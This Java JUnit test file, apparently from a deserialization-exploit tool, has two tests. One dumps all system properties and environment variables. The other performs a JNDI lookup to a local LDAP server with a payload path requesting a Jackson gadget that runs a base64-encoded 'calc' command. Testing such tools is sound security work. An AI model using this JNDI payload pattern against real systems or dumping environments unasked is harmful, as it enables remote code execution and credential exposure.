package com.h2tg.ysogate;

import org.junit.Test;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

public class CiTest {
    @Test
    public void test() {
        System.out.println("System.getProperties(): " + System.getProperties());
        System.out.println("System.getenv(): " + System.getenv());
    }

    @Test
    public void jndi() throws NamingException
    {
        Context ctx = new InitialContext();
        Object result = ctx.lookup("ldap://127.0.0.1:1389/Deserialize/Jackson/Command/Y2FsYw==");
    }

}